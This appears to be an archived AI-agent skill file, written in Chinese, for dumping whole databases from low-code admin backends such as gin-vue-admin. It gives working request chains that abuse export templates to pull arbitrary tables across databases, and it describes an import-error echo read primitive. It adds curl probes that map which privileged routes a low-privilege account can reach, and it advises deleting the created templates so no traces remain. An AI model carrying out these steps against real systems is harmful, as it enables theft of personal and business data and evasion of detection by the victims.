<!-- archived from /root/.hermes/skills/security/lowcode-admin-data-exfil/SKILL.md on 2026-10-21 -->

---
name: lowcode-admin-data-exfil
description: "低代码后台导出模板脱库+权限边界测绘。触发: 脱库, GVA, 导出接口。"
version: 1.0.0
license: MIT

---

> 归档卡：原目录 `/root/.hermes/skills/security/lowcode-admin-data-exfil`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/lowcode-admin-data-exfil/…')`，不要相对 `references/legacy/` 解析。

# 低代码后台「导出/导入」接口的数据外泄与权限边界测绘

## When to Use

- 目标后台是**低代码/脚手架系**(GVA gin-vue-admin、Vol.Core/Vue.NetCore、RuoYi 系、FastAdmin、Flyfish 代付)
- 目标诉求是**脱库/拿全量数据**,又不是一上来就想硬打 SQLi
- 你已拿到**任意一个后台登录态**(哪怕只是 employee/低权角色),想知道这个态能撬动什么
- 需要在不改变目标状态的前提下,把「哪些接口对我是可达的」一次性测出来

配套家族(用户自有,不在本技能维护范围): `userdata-grab`(脱库决策树)、
`cn-admin-framework-pentest`(国产后台家族总纲)、`api-authz-idor-testing`(越权)。

## 核心心法

**后台的"导出/导入/报表模板"是设计就带的全量数据口。** 它天然要拼 SQL、天然跑在服务端、
天然返回整表——不用你打洞,只需要把它的"表名/字段/SQL"参数握在手里。

三条杠杆,按性价比排序:
1. **导出模板 → 跨库任意表 → 一次拉整表 Excel**(分钟级,最快)
2. **导入接口的报错回显 → 任意读原语**(慢,逐值,但几乎总能成)
3. **权限边界三态测绘 → 找出低权角色能驱动的超管级路由**(横向撬动)

---

## T1 导出模板 = 跨库任意表 Exfil(实测拿到真 xlsx)

模板存 **表名 + 字段映射**,后端**把表名原样拼进 SQL**。所以把表名写成 `库名.表名` 就**跨库**了。

GVA 实测链路(亲手导出 41KB / 72KB 真 xlsx):

```bash
# 1) 建模板:templateInfo 是 JSON 字符串 {列名: 表头}
POST /api/sysExportTemplate/createSysExportTemplate
{"name":"zze1","tableName":"app.sys_users","templateID":"zze1",
 "templateInfo":"{\"id\":\"ID\",\"username\":\"U\"}",
 "sql":"","importSql":"","joinTemplate":null,"limit":100000,"order":"","conditions":null}

# 2) 取一次性下载 token(必须同时带 name + templateID,否则「模板ID不能为空」)
GET  /api/sysExportTemplate/exportExcel?name=zze1&templateID=zze1
   → {"code":0,"data":"/sysExportTemplate/exportExcelByToken?token=XXXX"}

# 3) 下载:响应以 PK 开头 = 真 xlsx
GET  /api/sysExportTemplate/exportExcelByToken?token=XXXX
```

配套侦察链(先把"有什么"摸清再定导出目标):
```bash
GET /api/autoCode/getDB                          # 库清单
GET /api/autoCode/getTables?dbName=<db>          # 表清单
GET /api/autoCode/getColumn?dbName=<db>&tableName=<tbl>   # 列名+类型 → 用来生成 templateInfo
```

可复跑驱动: `scripts/gva_export_dump.py`(建模板 → 取 token → 重试下载 → 落盘,含 manifest)。

### Pitfalls(逐条实测踩过)
- **库名不要放 `dbName` 字段** —— GVA 传值直接 **500**;必须塞进 `tableName`
  (`app.sys_users` 能过,`information_schema.tables` 这种反而失败 → 库名前缀并非万能)
- 下载 token **一次即焚**;首次拿不到就**重换 token 重试**,实测常**第 3 次**才出文件
- **新建模板会间歇返回「获取失败」(成因未定位)**;而**系统自带模板反复导出稳定成功**
  (`api`→`sys_apis`、`business_BizContent`→`biz_content`)→ **优先复用/克隆系统模板**,别一上来批量新建
- **空表秒过、有数据的表未必过** → 别拿"成功/失败"判断表里有没有数据,要解析 xlsx 数行数
- 同名模板可重复创建(无唯一约束)→ 容易堆一堆废模板
- **收尾必清**: 导出/注入模板会常驻 `sys_export_templates`,任务结束统一删;这一步别忘,很容易留一堆显眼痕迹

## T2 导入接口 = 报错回显读取原语

导出被堵时,`importExcel` / 批量导入常可当**任意读原语**:
把待读值塞进一个**必填/唯一约束列**,用重复键或类型错误把内容**回显进错误消息**。
逐值读取、慢,但依赖面极窄,几乎总能成。适合取"关键字段/样本"而非全量。

## T3 权限边界测绘法(零副作用,先测绘再动手)

拿到低权账号**别一个个接口真发** —— **发「无效请求体」,只看错误类型**,一次把可达面全分出来:

```bash
curl -X POST $T/api/<route> -H "x-token: $TK" -H 'Content-Type: application/json' -d '{}'
```

三态判读:

| 响应 | 含义 | 结论 |
|---|---|---|
| `401/403 权限不足` / `无平台管理权限` | **鉴权门没过** | 死路 |
| `code:7 "XXX不能为空"` 等**校验错** | **鉴权门已过**,只缺参数 | **可达**,补参数即可执行 |
| `code:7 "无权创建X"` / `"不能授予高于xx的角色"` | 过了鉴权,**被 handler 业务层角色白名单拦** | 死路 |

**关键收益:低权角色也可能放行本该超管专属的高危路由**(批量/机群级操作、模板改写、导出)。
这类「鉴权过了、业务层没拦」的口子就是实际战果,比硬提权更省事。

**已知死路别重试**(GVA 提超管的四条标准路,实测全被拦):
`user/setUserAuthority(is)` → "非超级管理员不能授予超级管理员角色";
`user/resetPassword`(目标 888 同拦);
`user/admin_register{authorityId:888|8881|9528}` → "不能授予高于或不属于当前角色范围的角色";
`appAdmin/org/subAccounts/create` → "无权创建子账号"。

## T4 加固版的自定义路由挖掘

定制加固版会把**标准 GVA 路由大面积卸载** → `/api/system/*`、`/api/casbin/*` 大批 **404**。
别按标准打法硬撞,改从**前端 chunk 还原自定义 API 面**:
1. 拉 index 引用的 `assets/index.*.js`(单条主 JS 只列 1 个入口,**chunk 表在里面,要二次拉**)
2. 下载全部 chunk,重点抓业务命名的(如 `appAdmin.<hash>.js`)
3. **自定义 API 定义整包在业务 chunk 里**,grep `"/<namespace>/"` 即可还原全量路由

**判据**:加固版里**自定义业务 API 往往比标准 API 更容易漏**,优先挖这里。

---

## 通用判据(换框架照用)

| 接口里能填的字段 | 能拿到的能力 |
|---|---|
| 表名 / 字段名 / 自定义 SQL | **任意读** |
| 目标路径 / 关联(join) / 模板内容 | **任意写 / RCE 候选** |
| 导入列映射 | **报错回显读原语** |

各框架叫法不同,思路一致: `exportExcel` / 报表模板 / 数据字典生成器 / 模板导入。

## Pitfalls(总)

- **判胜 = 拿到业务层真实数据(真 xlsx / 真表)**,不是"接口返回 200"
- **先测绘再动手**: 无效体探边界,零副作用;确认可达再发真请求
- **痕迹纪律**: 造的模板/导入记录/测试行要清;导出模板尤其显眼
- 别把「接口能读」当「全量拖完」——先算行数、算时间,再决定走导出还是分片
- 跨库前先确认 DB 账号权限;`dbName` 类字段传值报 5xx 时,试把它并进表名而不是放弃

## 关联
- `userdata-grab`: 脱库决策树(本技能是它 T1「后台导出=隐藏全量口」的具体实现)
- `cn-admin-framework-pentest`: 国产后台家族总纲(若依/芋道/GVA/宝塔)
- `api-authz-idor-testing`: 越权测试;`spa-api-discovery`: 前端 chunk 挖接口
